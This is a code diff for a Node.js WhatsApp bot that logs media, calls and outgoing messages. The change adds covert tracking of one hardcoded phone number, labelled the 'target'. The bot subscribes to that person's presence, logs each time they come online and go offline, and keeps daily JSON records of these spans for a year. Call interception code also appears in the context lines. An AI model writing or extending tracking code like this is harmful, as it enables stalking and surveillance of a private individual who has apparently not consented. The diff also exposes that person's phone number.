@@ -51,23 +51,35 @@ async function uploadToDrive(filePath, fileName, mimeType) {
 // Directories isolated for Bot 4
 const logsDir = path.join(__dirname, 'bot4_logs');
 const outboxDir = path.join(__dirname, 'bot4_outbox');
+const ologsDir = path.join(__dirname, 'bot4_ologs'); // Online presence logs
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir);
 if (!fs.existsSync(outboxDir)) fs.mkdirSync(outboxDir);
+if (!fs.existsSync(ologsDir)) fs.mkdirSync(ologsDir);
+
+// Target account to track online presence
+const TRACK_JID = '917054406788@s.whatsapp.net';
+
+// In-memory: store the timestamp when target went online
+// This is a single primitive — no memory bloat
+let onlineSince = null;
 
 // 365-Day Retention Cleanup
 function cleanOldLogs() {
     try {
-        const files = fs.readdirSync(logsDir);
         const now = Date.now();
-        files.forEach(file => {
-            if (file.endsWith('.json')) {
-                const filePath = path.join(logsDir, file);
-                const stats = fs.statSync(filePath);
-                if ((now - stats.mtimeMs) / (1000 * 60 * 60 * 24) > 365) {
-                    fs.unlinkSync(filePath);
+        // Clean both chat logs and online logs directories
+        for (const dir of [logsDir, ologsDir]) {
+            const files = fs.readdirSync(dir);
+            files.forEach(file => {
+                if (file.endsWith('.json')) {
+                    const filePath = path.join(dir, file);
+                    const stats = fs.statSync(filePath);
+                    if ((now - stats.mtimeMs) / (1000 * 60 * 60 * 24) > 365) {
+                        fs.unlinkSync(filePath);
+                    }
                 }
-            }
-        });
+            });
+        }
     } catch (e) { console.error("bot4 Cleanup error:", e.message); }
 }
 
@@ -75,6 +87,43 @@ cleanOldLogs();
 setInterval(cleanOldLogs, 24 * 60 * 60 * 1000);
 
 let outboxInterval; 
+
+// Helper: write a completed online timespan to the correct day log file
+// This is a pure sync function — no promises, no memory retained after call
+function writeOnlineSpan(startMs, endMs) {
+    try {
+        const startDate = new Date(startMs);
+        const endDate = new Date(endMs);
+        const formatter = new Intl.DateTimeFormat('en-IN', { timeZone: 'Asia/Kolkata', day: '2-digit', month: '2-digit', year: 'numeric' });
+        const parts = formatter.formatToParts(startDate);
+        const fileName = `${parts.find(p => p.type === 'day').value}-${parts.find(p => p.type === 'month').value}-${parts.find(p => p.type === 'year').value}.json`;
+        const filePath = path.join(ologsDir, fileName);
+
+        const durationMs = endMs - startMs;
+        const durationSec = Math.round(durationMs / 1000);
+        const minutes = Math.floor(durationSec / 60);
+        const seconds = durationSec % 60;
+        const durationStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
+
+        const toIST = (ms) => new Date(ms).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
+
+        const span = {
+            from: toIST(startMs),
+            to: toIST(endMs),
+            duration: durationStr,
+            fromMs: startMs,
+            toMs: endMs
+        };
+
+        let daySpans = [];
+        if (fs.existsSync(filePath)) {
+            try { daySpans = JSON.parse(fs.readFileSync(filePath)); } catch(e) { daySpans = []; }
+        }
+        daySpans.push(span);
+        fs.writeFileSync(filePath, JSON.stringify(daySpans, null, 2));
+    } catch(e) { console.error('bot4 writeOnlineSpan error:', e.message); }
+}
+
 
 async function startbot4() {
     console.log('\n🤖 Booting bot4 (Media, Call & Outbox Logger)...');
@@ -95,17 +144,30 @@ async function startbot4() {
 
     sock4.ev.on('creds.update', saveCreds);
 
-    sock4.ev.on('connection.update', (u) => {
+    sock4.ev.on('connection.update', async (u) => {
         const { connection, qr } = u;
         if (qr) qrcode.generate(qr, { small: true });
-        if (connection === 'open') console.log('\n✅ Bot4 is Online and Logging Account 4.\n');
+        if (connection === 'open') {
+            console.log('\n✅ Bot4 is Online and Logging Account 4.\n');
+            // Subscribe to presence updates for the tracked number
+            // This tells WhatsApp server to push presence events for this contact
+            try {
+                await sock4.presenceSubscribe(TRACK_JID);
+                console.log(`📶 Subscribed to presence for ${TRACK_JID}`);
+            } catch(e) { console.error('bot4 presenceSubscribe error:', e.message); }
+        }
         if (connection === 'close') {
+            // If we had an open session when connection dropped, close the span
+            if (onlineSince !== null) {
+                try { writeOnlineSpan(onlineSince, Date.now()); } catch(e){}
+                onlineSince = null;
+            }
             const reason = u.lastDisconnect?.error?.output?.statusCode || u.lastDisconnect?.error?.message;
             if (reason === 401) {
                 console.log("⚠️ Session Invalid (401). Wiping old session data to generate a new QR Code...");
                 try { fs.rmSync(path.join(__dirname, 'auth_baileys_4'), { recursive: true, force: true }); } catch(e){}
                 console.log("🔄 Exiting process to allow a clean restart...");
-                process.exit(1); // Safest way to drop the bad socket and let PM2/user restart fresh
+                process.exit(1);
             } else {
                 console.log(`\n❌ Connection Closed. Reason: ${reason}. Reconnecting in 2s...`);
                 setTimeout(startbot4, 2000); 
@@ -158,6 +220,37 @@ async function startbot4() {
             }
         } catch (err) { }
     }, 2000); 
+
+    // 📡 ONLINE PRESENCE TRACKER for +917054406788
+    // WhatsApp pushes 'available'/'unavailable' presence updates for subscribed contacts.
+    // We record timespans: when they go available = span starts; when unavailable = span ends.
+    // onlineSince is a single epoch ms number — negligible memory footprint.
+    sock4.ev.on('presence.update', ({ id, presences }) => {
+        try {
+            if (id !== TRACK_JID) return; // Only care about our target
+
+            const presenceData = presences[TRACK_JID];
+            if (!presenceData) return;
+
+            const status = presenceData.lastKnownPresence; // 'available' | 'unavailable' | 'composing' etc.
+
+            if (status === 'available' || status === 'composing') {
+                // Target came online — record start time (only if not already tracking)
+                if (onlineSince === null) {
+                    onlineSince = Date.now();
+                    console.log(`\ud83d\udfe2 [PRESENCE] 917054406788 went ONLINE at ${new Date(onlineSince).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true })}`);
+                }
+            } else if (status === 'unavailable') {
+                // Target went offline — close the span if we were tracking
+                if (onlineSince !== null) {
+                    const endMs = Date.now();
+                    console.log(`\ud83d\udd34 [PRESENCE] 917054406788 went OFFLINE at ${new Date(endMs).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true })}`);
+                    writeOnlineSpan(onlineSince, endMs);
+                    onlineSince = null;
+                }
+            }
+        } catch(e) { console.error('bot4 presence.update error:', e.message); }
+    });
 
     // Call Interception Logic
     sock4.ev.on('call', async (calls) => {
